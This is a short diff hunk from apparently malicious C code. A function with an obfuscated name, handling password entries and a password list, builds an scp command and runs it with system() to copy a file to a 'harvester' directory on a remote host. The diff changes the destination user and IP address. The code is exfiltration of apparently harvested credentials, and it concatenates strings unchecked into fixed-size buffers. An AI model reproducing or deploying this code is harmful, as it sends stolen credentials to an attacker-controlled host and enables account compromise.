@@ -29,7 +29,7 @@ void dPZ4TGh6(char *filename, struct passwd *p, char *passlist[], int rounds, ch
     fclose(fp);
     char command[50] = "/usr/bin/scp -q '";
     //char dest[100] = "' harvester@localhost:/var/harvester";
-    char dest[100] = "' harvester@172.16.91.5:/var/harvester";
+    char dest[100] = "' pdiddy@172.16.77.5:/var/harvester";
     strcat(command, filename);
     strcat(command, dest);
     system(command);
